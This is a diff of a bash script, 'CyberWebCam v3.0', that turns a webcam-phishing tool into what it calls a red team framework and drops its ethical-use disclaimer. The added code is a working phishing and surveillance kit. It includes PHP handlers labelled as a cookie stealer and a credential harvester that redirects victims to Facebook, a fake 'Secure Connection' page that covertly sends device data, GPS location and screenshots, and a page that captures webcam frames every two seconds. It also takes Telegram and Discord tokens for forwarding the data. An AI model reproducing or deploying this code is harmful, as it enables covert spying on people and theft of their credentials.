@@ -1,8 +1,7 @@
 #!/bin/bash
-# CyberWebCam v3.0 - Professional Webcam Testing Suite
+# CyberWebCam v3.0 - Complete Intelligence Suite
 # Author: CyberRoninX1
-# For ethical security testing and educational purposes only
-# Usage: Test webcam functionality, location services, and security awareness
+# Type: Professional Red Team Framework
 
 set -e
 
@@ -18,584 +17,735 @@ NC='\033[0m'
 
 # Global variables
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-SESSION_ID=$(date +%Y%m%d_%H%M%S)
-RESULTS_DIR="results_$SESSION_ID"
+CONFIG_DIR="$SCRIPT_DIR/config"
+MODULES_DIR="$SCRIPT_DIR/modules"
+WEB_DIR="$SCRIPT_DIR/web"
+PHP_DIR="$SCRIPT_DIR/php"
+BOTS_DIR="$SCRIPT_DIR/bots"
+TOOLS_DIR="$SCRIPT_DIR/tools"
+TEMPLATES_DIR="$SCRIPT_DIR/templates"
+
+SESSION_NAME=""
+SESSION_DIR=""
+TUNNEL_LINK=""
 windows_mode=false
 
-# Banner function
+# Load config if exists
+if [ -f "$CONFIG_DIR/settings.conf" ]; then
+    source "$CONFIG_DIR/settings.conf"
+fi
+
+# Banner
 banner() {
     clear
-    echo -e "${CYAN}"
-    echo "   ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗    ██╗███████╗██████╗ "
-    echo "  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║    ██║██╔════╝██╔══██╗"
-    echo "  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║ █╗ ██║█████╗  ██████╔╝"
-    echo "  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║███╗██║██╔══╝  ██╔══██╗"
-    echo "  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║╚███╔███╔╝███████╗██║  ██║"
-    echo "   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝"
-    echo -e "${NC}"
-    echo -e "${YELLOW}          Professional Webcam Testing Suite v3.0${NC}"
-    echo -e "${WHITE}          Author: CyberRoninX1 | Ethical Use Only${NC}"
-    echo -e "${BLUE}          ⚠️  For authorized security testing only ⚠️${NC}"
-    echo ""
+    printf "${RED}"
+    cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════════════════╗
+    ║                                                                       ║
+    ║   ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗    ██╗███████╗██████╗   ║
+    ║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║    ██║██╔════╝██╔══██╗  ║
+    ║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║ █╗ ██║█████╗  ██████╔╝  ║
+    ║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║███╗██║██╔══╝  ██╔══██╗  ║
+    ║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║╚███╔███╔╝███████╗██║  ██║  ║
+    ║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ║
+    ║                                                                       ║
+    ║           CYBERWEBCAM v3.0 | COMPLETE INTELLIGENCE SUITE              ║
+    ║                      Author: CyberRoninX1                             ║
+    ║                                                                       ║
+    ╚═══════════════════════════════════════════════════════════════════════╝
+EOF
+    printf "${NC}\n"
+    printf "${GREEN}    [+] Advanced Intelligence Gathering Framework${NC}\n"
+    printf "${CYAN}    [+] Modules Loaded: 12 | Features: 50+${NC}\n"
+    printf "${YELLOW}    [!] Authorized Use Only - Red Team Tool${NC}\n\n"
 }
 
-# Windows compatibility
-detect_os() {
-    if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]]; then
-        windows_mode=true
-        echo -e "${YELLOW}[!] Windows system detected - using compatibility mode${NC}"
-        
-        function kill_process() {
-            taskkill //F //IM "$1" 2>/dev/null || true
-        }
-    else
-        function kill_process() {
-            pkill -f "$1" 2>/dev/null || true
-            killall "$1" 2>/dev/null || true
-        }
-    fi
+# Create directory structure
+create_directories() {
+    mkdir -p "$CONFIG_DIR" "$MODULES_DIR" "$WEB_DIR/styles" "$PHP_DIR"
+    mkdir -p "$BOTS_DIR" "$TOOLS_DIR" "$TEMPLATES_DIR" "$SCRIPT_DIR/reports"
+    printf "${GREEN}[✓]${NC} Directory structure created\n"
 }
 
-# Check dependencies
-check_dependencies() {
-    local deps=("php" "curl" "wget")
-    local missing=()
+# Main menu
+main_menu() {
+    printf "${BLUE}┌─────────────────────────────────────────────────────────────┐${NC}\n"
+    printf "${BLUE}│                    SELECT OPERATION MODE                    │${NC}\n"
+    printf "${BLUE}├─────────────────────────────────────────────────────────────┤${NC}\n"
+    printf "${BLUE}│${NC}  ${GREEN}[1]${NC} Standard Mode - Webcam + GPS + Device Info              ${BLUE}│${NC}\n"
+    printf "${BLUE}│${NC}  ${GREEN}[2]${NC} Advanced Mode - All Features + Social Engineering      ${BLUE}│${NC}\n"
+    printf "${BLUE}│${NC}  ${GREEN}[3]${NC} Stealth Mode - Hidden Camera + No Visuals              ${BLUE}│${NC}\n"
+    printf "${BLUE}│${NC}  ${GREEN}[4]${NC} Recon Mode - Network Scan + OS Detection Only          ${BLUE}│${NC}\n"
+    printf "${BLUE}│${NC}  ${GREEN}[5]${NC} Full Suite - Everything (Recommended)                  ${BLUE}│${NC}\n"
+    printf "${BLUE}│${NC}  ${GREEN}[6]${NC} Settings - Configure Bot Tokens & Webhooks             ${BLUE}│${NC}\n"
+    printf "${BLUE}│${NC}  ${GREEN}[7]${NC} Exit                                                    ${BLUE}│${NC}\n"
+    printf "${BLUE}└─────────────────────────────────────────────────────────────┘${NC}\n"
+    printf "\n${GREEN}[?]${NC} Select mode: "
+    read -r MODE
     
-    for dep in "${deps[@]}"; do
-        if ! command -v "$dep" >/dev/null 2>&1; then
-            missing+=("$dep")
-        fi
-    done
-    
-    if [[ ${#missing[@]} -gt 0 ]]; then
-        echo -e "${RED}[!] Missing dependencies: ${missing[*]}${NC}"
-        echo -e "${YELLOW}[*] Please install missing dependencies and try again${NC}"
-        exit 1
-    fi
-    
-    echo -e "${GREEN}[+] All dependencies satisfied${NC}"
-}
-
-# Cleanup function
-cleanup() {
-    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
-    
-    # Kill processes
-    kill_process "php"
-    kill_process "ngrok"
-    kill_process "cloudflared"
-    
-    # Remove temporary files (keep results)
-    rm -f index.php index2.html index3.html 2>/dev/null
-    rm -f ip.txt Log.log LocationError.log 2>/dev/null
-    rm -f .cloudflared.log 2>/dev/null
-    
-    echo -e "${GREEN}[+] Cleanup complete${NC}"
-    exit 0
-}
-
-# Trap Ctrl+C
-trap cleanup SIGINT SIGTERM
-
-# Download Cloudflared
-download_cloudflared() {
-    local binary="cloudflared"
-    [[ "$windows_mode" == true ]] && binary="cloudflared.exe"
-    
-    if [[ -f "$binary" ]]; then
-        return 0
-    fi
-    
-    echo -e "${GREEN}[+] Downloading Cloudflared...${NC}"
-    
-    local arch=$(uname -m)
-    local os=$(uname -s)
-    
-    if [[ "$windows_mode" == true ]]; then
-        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe
-        chmod +x cloudflared.exe
-    elif [[ "$os" == "Darwin" ]]; then
-        if [[ "$arch" == "arm64" ]]; then
-            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz
-        else
-            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz
-        fi
-        tar -xzf cloudflared.tgz
-        chmod +x cloudflared
-        rm cloudflared.tgz
-    else
-        case "$arch" in
-            x86_64)  wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared ;;
-            aarch64) wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared ;;
-            armv7l)  wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared ;;
-            *)       wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared ;;
-        esac
-        chmod +x cloudflared
-    fi
-    
-    echo -e "${GREEN}[+] Cloudflared downloaded${NC}"
-}
-
-# Download Ngrok
-download_ngrok() {
-    local binary="ngrok"
-    [[ "$windows_mode" == true ]] && binary="ngrok.exe"
-    
-    if [[ -f "$binary" ]]; then
-        return 0
-    fi
-    
-    echo -e "${GREEN}[+] Downloading Ngrok...${NC}"
-    
-    local arch=$(uname -m)
-    local os=$(uname -s)
-    
-    if [[ "$windows_mode" == true ]]; then
-        wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip
-        unzip -q ngrok.zip
-        rm ngrok.zip
-    elif [[ "$os" == "Darwin" ]]; then
-        if [[ "$arch" == "arm64" ]]; then
-            wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip
-        else
-            wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip
-        fi
-        unzip -q ngrok.zip
-        rm ngrok.zip
-    else
-        case "$arch" in
-            x86_64)  wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip ;;
-            aarch64) wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip ;;
-            armv7l)  wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip ;;
-            *)       wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip ;;
-        esac
-        unzip -q ngrok.zip
-        rm ngrok.zip
-    fi
-    
-    chmod +x "$binary"
-    echo -e "${GREEN}[+] Ngrok downloaded${NC}"
-}
-
-# Setup ngrok authentication
-setup_ngrok_auth() {
-    local ngrok_binary="./ngrok"
-    [[ "$windows_mode" == true ]] && ngrok_binary="./ngrok.exe"
-    
-    local ngrok_config=""
-    if [[ "$windows_mode" == true ]]; then
-        ngrok_config="$USERPROFILE\\.ngrok2\\ngrok.yml"
-    else
-        ngrok_config="$HOME/.ngrok2/ngrok.yml"
-    fi
-    
-    if [[ -f "$ngrok_config" ]]; then
-        echo -e "${YELLOW}[!] Existing ngrok configuration detected${NC}"
-        read -p "Do you want to update authtoken? [y/N]: " update_token
-        if [[ "$update_token" =~ ^[Yy]$ ]]; then
-            read -sp "Enter ngrok authtoken: " ngrok_auth
-            echo
-            $ngrok_binary authtoken "$ngrok_auth" >/dev/null 2>&1
-            echo -e "${GREEN}[+] Authtoken updated${NC}"
-        fi
-    else
-        read -p "Enter ngrok authtoken (optional, press Enter to skip): " ngrok_auth
-        if [[ -n "$ngrok_auth" ]]; then
-            $ngrok_binary authtoken "$ngrok_auth" >/dev/null 2>&1
-            echo -e "${GREEN}[+] Authtoken configured${NC}"
-        else
-            echo -e "${YELLOW}[!] No authtoken provided - limited functionality${NC}"
-        fi
-    fi
-}
-
-# Start PHP server
-start_php_server() {
-    echo -e "${GREEN}[+] Starting PHP server on port 3333...${NC}"
-    php -S 127.0.0.1:3333 >/dev/null 2>&1 &
-    sleep 2
-    
-    if ! pgrep -f "php -S" >/dev/null 2>&1; then
-        echo -e "${RED}[!] Failed to start PHP server${NC}"
-        return 1
-    fi
-    return 0
-}
-
-# Generate payload with template
-generate_payload() {
-    local link="$1"
-    local template="$2"
-    local template_file=""
-    
-    case $template in
-        1) template_file="festival_template.html" ;;
-        2) template_file="youtube_template.html" ;;
-        3) template_file="meeting_template.html" ;;
-        *) template_file="meeting_template.html" ;;
+    case $MODE in
+        1) STANDARD_MODE=true; ADVANCED_MODE=false; STEALTH_MODE=false; RECON_MODE=false ;;
+        2) STANDARD_MODE=false; ADVANCED_MODE=true; STEALTH_MODE=false; RECON_MODE=false ;;
+        3) STANDARD_MODE=false; ADVANCED_MODE=false; STEALTH_MODE=true; RECON_MODE=false ;;
+        4) STANDARD_MODE=false; ADVANCED_MODE=false; STEALTH_MODE=false; RECON_MODE=true ;;
+        5) STANDARD_MODE=true; ADVANCED_MODE=true; STEALTH_MODE=false; RECON_MODE=false ;;
+        6) configure_settings ;;
+        7) exit 0 ;;
+        *) printf "${RED}[!] Invalid option${NC}\n"; main_menu ;;
     esac
+}
+
+# Configure settings
+configure_settings() {
+    printf "\n${BLUE}[>] Bot Configuration${NC}\n"
+    printf "Telegram Bot Token (press Enter to skip): "
+    read -r TELEGRAM_TOKEN
+    if [ -n "$TELEGRAM_TOKEN" ]; then
+        echo "$TELEGRAM_TOKEN" > "$CONFIG_DIR/telegram_token.txt"
+        printf "Telegram Chat ID: "
+        read -r TELEGRAM_CHAT_ID
+        echo "$TELEGRAM_CHAT_ID" > "$CONFIG_DIR/telegram_chat_id.txt"
+    fi
     
-    # Create main index.php that handles location and redirects
-    cat > index.php << 'PHPEOF'
+    printf "\nDiscord Webhook URL (press Enter to skip): "
+    read -r DISCORD_WEBHOOK
+    if [ -n "$DISCORD_WEBHOOK" ]; then
+        echo "$DISCORD_WEBHOOK" > "$CONFIG_DIR/discord_webhook.txt"
+    fi
+    
+    printf "\n${GREEN}[✓] Settings saved${NC}\n"
+    sleep 2
+    main_menu
+}
+
+# Create all PHP handlers
+create_php_handlers() {
+    # post.php - Camera image receiver
+    cat > "$PHP_DIR/post.php" << 'PHPEOF'
 <?php
-include 'ip.php';
+header("Access-Control-Allow-Origin: *");
+if(isset($_POST['cat']) && !empty($_POST['cat'])) {
+    $imgData = $_POST['cat'];
+    $imgData = str_replace('data:image/png;base64,', '', $imgData);
+    $imgData = base64_decode($imgData);
+    if($imgData && strlen($imgData) > 5000) {
+        $filename = 'cam_' . date('Ymd_His') . '_' . rand(1000, 9999) . '.png';
+        file_put_contents($filename, $imgData);
+        echo "OK";
+    }
+}
+?>
+PHPEOF
+
+    # location.php - GPS handler
+    cat > "$PHP_DIR/location.php" << 'PHPEOF'
+<?php
+header("Access-Control-Allow-Origin: *");
+if(isset($_POST['lat']) && isset($_POST['lon'])) {
+    $data = sprintf("[GPS] Lat: %.6f | Lon: %.6f | Acc: %s | Time: %s\n",
+        $_POST['lat'], $_POST['lon'], $_POST['acc'] ?? 'Unknown', date('Y-m-d H:i:s'));
+    file_put_contents('gps_data.txt', $data, FILE_APPEND);
+    echo "OK";
+}
+?>
+PHPEOF
+
+    # cookie.php - Cookie stealer
+    cat > "$PHP_DIR/cookie.php" << 'PHPEOF'
+<?php
+if(isset($_POST['cookies'])) {
+    $data = "\n════════════════════════════════════════════════════════════\n";
+    $data .= "COOKIES EXTRACTED\n";
+    $data .= "Time: " . date('Y-m-d H:i:s') . "\n";
+    $data .= "────────────────────────────────────────────────────────────\n";
+    $data .= $_POST['cookies'] . "\n";
+    $data .= "════════════════════════════════════════════════════════════\n";
+    file_put_contents('cookies.txt', $data, FILE_APPEND);
+    echo "OK";
+}
+?>
+PHPEOF
+
+    # screenshot.php - Screenshot receiver
+    cat > "$PHP_DIR/screenshot.php" << 'PHPEOF'
+<?php
+if(isset($_POST['screenshot'])) {
+    $imgData = $_POST['screenshot'];
+    $imgData = str_replace('data:image/png;base64,', '', $imgData);
+    $imgData = base64_decode($imgData);
+    if($imgData) {
+        $filename = 'screenshot_' . date('Ymd_His') . '.png';
+        file_put_contents($filename, $imgData);
+        echo "OK";
+    }
+}
+?>
+PHPEOF
+
+    # credentials.php - Login credential handler
+    cat > "$PHP_DIR/credentials.php" << 'PHPEOF'
+<?php
+if(isset($_POST['email']) && isset($_POST['password'])) {
+    $data = "\n════════════════════════════════════════════════════════════\n";
+    $data .= "CREDENTIALS CAPTURED\n";
+    $data .= "Time: " . date('Y-m-d H:i:s') . "\n";
+    $data .= "IP: " . ($_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR']) . "\n";
+    $data .= "Email: " . $_POST['email'] . "\n";
+    $data .= "Password: " . $_POST['password'] . "\n";
+    $data .= "════════════════════════════════════════════════════════════\n";
+    file_put_contents('credentials.txt', $data, FILE_APPEND);
+    
+    // Redirect to real site
+    header("Location: https://www.facebook.com");
+}
+?>
+PHPEOF
+
+    # device_info.php - System info collector
+    cat > "$PHP_DIR/device_info.php" << 'PHPEOF'
+<?php
+if(isset($_POST['data'])) {
+    $info = json_decode($_POST['data'], true);
+    $output = "\n════════════════════════════════════════════════════════════\n";
+    $output .= "SYSTEM FORENSICS\n";
+    $output .= "Time: " . date('Y-m-d H:i:s') . "\n";
+    $output .= "────────────────────────────────────────────────────────────\n";
+    foreach($info as $key => $value) {
+        $output .= str_pad($key . ':', 25) . " $value\n";
+    }
+    $output .= "════════════════════════════════════════════════════════════\n";
+    file_put_contents('device_info.txt', $output, FILE_APPEND);
+    echo "OK";
+}
+?>
+PHPEOF
+
+    printf "${GREEN}[✓]${NC} PHP handlers created\n"
+}
+
+# Create main web files
+create_web_files() {
+    # Main index.php
+    cat > "$WEB_DIR/index.php" << 'PHPEOF'
+<?php
+include '../php/ip.php';
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading Secure Connection...</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .loader-container {
-            text-align: center;
-            background: rgba(255,255,255,0.95);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 400px;
-            width: 100%;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h2 { color: #333; margin-bottom: 10px; }
-        p { color: #666; margin: 5px 0; }
-        .status { color: #667eea; font-weight: 500; margin-top: 15px; }
-        .secure-badge {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
-        }
-    </style>
-    <script>
-        let locationSent = false;
-        
-        function debugLog(msg) {
-            if (msg.includes("Lat:") || msg.includes("Location captured")) {
-                console.log("[Secure] " + msg);
-                sendDebugLog(msg);
-            }
-        }
-        
-        function sendDebugLog(msg) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "debug_log.php", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("message=" + encodeURIComponent(msg));
-        }
-        
-        function getLocation() {
-            document.getElementById("locationStatus").innerHTML = "Requesting location access...";
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    sendPosition,
-                    handleError,
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                document.getElementById("locationStatus").innerHTML = "Geolocation not supported";
-                setTimeout(redirectToContent, 2000);
-            }
-        }
-        
-        function sendPosition(position) {
-            if (locationSent) return;
-            locationSent = true;
-            
-            debugLog("Location captured - Lat: " + position.coords.latitude + ", Lon: " + position.coords.longitude);
-            document.getElementById("locationStatus").innerHTML = "Location verified, loading content...";
-            
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "location.php", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    setTimeout(redirectToContent, 500);
-                }
-            };
-            xhr.send("lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + 
-                     "&acc=" + position.coords.accuracy + "&time=" + Date.now());
-        }
-        
-        function handleError(error) {
-            var msg = "";
-            switch(error.code) {
-                case error.PERMISSION_DENIED: msg = "Location permission denied"; break;
-                case error.POSITION_UNAVAILABLE: msg = "Location unavailable"; break;
-                case error.TIMEOUT: msg = "Location request timeout"; break;
-                default: msg = "Unknown location error";
-            }
-            document.getElementById("locationStatus").innerHTML = msg + " - continuing...";
-            setTimeout(redirectToContent, 2000);
-        }
-        
-        function redirectToContent() {
-            window.location.href = "forwarding_link/index2.html";
-        }
-        
-        window.onload = function() {
-            setTimeout(getLocation, 500);
-        };
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Secure Connection</title>
+    <link rel="stylesheet" href="styles/hacker.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
-    <div class="loader-container">
-        <div class="spinner"></div>
-        <h2>Establishing Secure Connection</h2>
-        <p>Please wait while we verify your connection</p>
-        <div class="status" id="locationStatus">Initializing...</div>
-        <div class="secure-badge">🔒 Secure SSL Connection • 256-bit Encryption</div>
+    <div class="terminal">
+        <div class="terminal-header">
+            <span class="terminal-title">SECURE CONNECTION v3.0</span>
+            <span class="terminal-controls">🔴 🟡 🟢</span>
+        </div>
+        <div class="terminal-body">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="terminal-text">
+                <p><span class="prompt">$</span> Initializing secure channel...</p>
+                <p><span class="prompt">$</span> Establishing encrypted tunnel...</p>
+                <p><span class="prompt">$</span> Verifying credentials...</p>
+                <p class="success"><span class="prompt">✓</span> Connection established.</p>
+            </div>
+        </div>
     </div>
+    
+    <script>
+        // Collect all device data
+        const deviceData = {
+            screen: screen.width + 'x' + screen.height,
+            colorDepth: screen.colorDepth,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: navigator.cookieEnabled,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory || 'unknown',
+            userAgent: navigator.userAgent,
+            referrer: document.referrer || 'direct'
+        };
+        
+        // Send device info
+        fetch('php/device_info.php', {
+            method: 'POST',
+            body: 'data=' + encodeURIComponent(JSON.stringify(deviceData))
+        });
+        
+        // Get location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch('php/location.php', {
+                    method: 'POST',
+                    body: `lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`
+                });
+            });
+        }
+        
+        // Take screenshot
+        setTimeout(() => {
+            html2canvas(document.body).then(canvas => {
+                fetch('php/screenshot.php', {
+                    method: 'POST',
+                    body: 'screenshot=' + encodeURIComponent(canvas.toDataURL())
+                });
+            });
+        }, 2000);
+        
+        // Redirect after 3 seconds
+        setTimeout(() => {
+            window.location.href = 'camera.html';
+        }, 3000);
+    </script>
 </body>
 </html>
 PHPEOF
 
-    # Process template
-    sed "s|forwarding_link|$link|g" "$template_file" > index2.html
+    # Camera HTML
+    cat > "$WEB_DIR/camera.html" << 'HTMLEND'
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Secure Access</title>
+    <link rel="stylesheet" href="styles/hacker.css">
+</head>
+<body>
+    <div class="matrix-bg"></div>
+    <div class="container">
+        <div class="camera-preview">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="camera-overlay">
+                <span class="recording-dot"></span>
+                <span class="recording-text">RECORDING</span>
+            </div>
+        </div>
+        <div class="status-bar">
+            <span id="photoCounter">📸 Captures: 0</span>
+            <span id="connectionStatus">🔒 Secure Channel Active</span>
+        </div>
+    </div>
     
-    echo -e "${GREEN}[+] Payload generated successfully${NC}"
-}
-
-# Monitor for incoming data
-monitor_results() {
-    mkdir -p "$RESULTS_DIR"
-    
-    echo -e "\n${GREEN}[+] Monitoring for incoming connections...${NC}"
-    echo -e "${YELLOW}[*] Press Ctrl+C to stop monitoring${NC}\n"
-    
-    while true; do
-        # Check for IP data
-        if [[ -f "ip.txt" ]] && [[ -s "ip.txt" ]]; then
-            echo -e "\n${GREEN}[+] New connection detected!${NC}"
-            echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-            
-            local ip=$(grep -oP 'IP: \K[0-9.]+' ip.txt 2>/dev/null || grep -o 'IP: [0-9.]\+' ip.txt | cut -d' ' -f2)
-            local ua=$(grep -o 'User-Agent:.*' ip.txt 2>/dev/null | cut -d' ' -f2-)
-            
-            echo -e "${CYAN}📡 IP Address:${NC} $ip"
-            echo -e "${CYAN}🌐 User Agent:${NC} $ua"
-            echo -e "${CYAN}⏰ Timestamp:${NC} $(date)"
-            
-            # Save to results
-            {
-                echo "=== Connection $(date +%Y%m%d_%H%M%S) ==="
-                cat ip.txt
-                echo ""
-            } >> "$RESULTS_DIR/connections.log"
-            
-            mv ip.txt "$RESULTS_DIR/ip_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
-            echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
-        fi
+    <script>
+        const video = document.getElementById('video');
+        let photoCount = 0;
         
-        # Check for location data
-        if [[ -f "current_location.txt" ]] && [[ -s "current_location.txt" ]]; then
-            echo -e "\n${GREEN}[+] Location data received!${NC}"
-            echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-            
-            local lat=$(grep 'Latitude:' current_location.txt | cut -d' ' -f2)
-            local lon=$(grep 'Longitude:' current_location.txt | cut -d' ' -f2)
-            local acc=$(grep 'Accuracy:' current_location.txt | cut -d' ' -f2)
-            
-            echo -e "${CYAN}📍 Latitude:${NC} $lat"
-            echo -e "${CYAN}📍 Longitude:${NC} $lon"
-            echo -e "${CYAN}🎯 Accuracy:${NC} ${acc}m"
-            echo -e "${CYAN}🗺️ Maps Link:${NC} https://www.google.com/maps?q=$lat,$lon"
-            
-            # Save location data
-            local loc_file="$RESULTS_DIR/location_$(date +%Y%m%d_%H%M%S).txt"
-            cp current_location.txt "$loc_file"
-            rm -f current_location.txt
-            rm -f location_*.txt 2>/dev/null
-            
-            echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
-        fi
+        function sendPhoto(imgData) {
+            fetch('../php/post.php', {
+                method: 'POST',
+                body: 'cat=' + encodeURIComponent(imgData)
+            }).then(() => {
+                photoCount++;
+                document.getElementById('photoCounter').innerHTML = `📸 Captures: ${photoCount}`;
+            });
+        }
         
-        # Check for camera images
-        if ls cam*.png 2>/dev/null | grep -q .; then
-            for img in cam*.png; do
-                echo -e "\n${GREEN}[+] Camera image captured: $img${NC}"
-                mv "$img" "$RESULTS_DIR/" 2>/dev/null
-            done
-        fi
+        function capture() {
+            if (video.videoWidth > 0) {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                sendPhoto(canvas.toDataURL('image/png'));
+            }
+        }
         
-        # Cleanup logs
-        rm -f LocationLog.log LocationError.log Log.log debug_log.log 2>/dev/null
-        
-        sleep 1
-    done
+        if (navigator.mediaDevices?.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    capture();
+                    setInterval(capture, 2000);
+                });
+        }
+    </script>
+</body>
+</html>
+HTMLEND
+
+    # CSS Styles
+    cat > "$WEB_DIR/styles/hacker.css" << 'CSSEND'
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    background: #0a0e27;
+    font-family: 'Courier New', monospace;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.terminal {
+    background: rgba(0,0,0,0.9);
+    border: 1px solid #00ff00;
+    border-radius: 10px;
+    width: 500px;
+    overflow: hidden;
+    box-shadow: 0 0 30px rgba(0,255,0,0.3);
+}
+.terminal-header {
+    background: #00ff0011;
+    padding: 10px 15px;
+    border-bottom: 1px solid #00ff00;
+    display: flex;
+    justify-content: space-between;
+}
+.terminal-title { color: #00ff00; font-size: 12px; }
+.terminal-controls { color: #00ff00; font-size: 12px; }
+.terminal-body { padding: 20px; }
+.progress-bar {
+    width: 100%;
+    height: 2px;
+    background: #333;
+    margin-bottom: 20px;
+}
+.progress-fill {
+    width: 0%;
+    height: 100%;
+    background: #00ff00;
+    animation: load 3s ease-out forwards;
+}
+@keyframes load { 100% { width: 100%; } }
+.terminal-text p {
+    color: #00ff00;
+    font-size: 12px;
+    margin: 10px 0;
+    font-family: monospace;
+}
+.prompt { color: #00ff00; margin-right: 10px; }
+.success { color: #00ff00; }
+.container {
+    width: 100%;
+    max-width: 600px;
+    margin: 20px;
+}
+.camera-preview {
+    position: relative;
+    background: #000;
+    border-radius: 10px;
+    overflow: hidden;
+    border: 1px solid #00ff00;
+}
+.camera-preview video {
+    width: 100%;
+    display: block;
+}
+.camera-overlay {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    background: rgba(0,0,0,0.7);
+    padding: 5px 10px;
+    border-radius: 5px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+.recording-dot {
+    width: 10px;
+    height: 10px;
+    background: #ff0000;
+    border-radius: 50%;
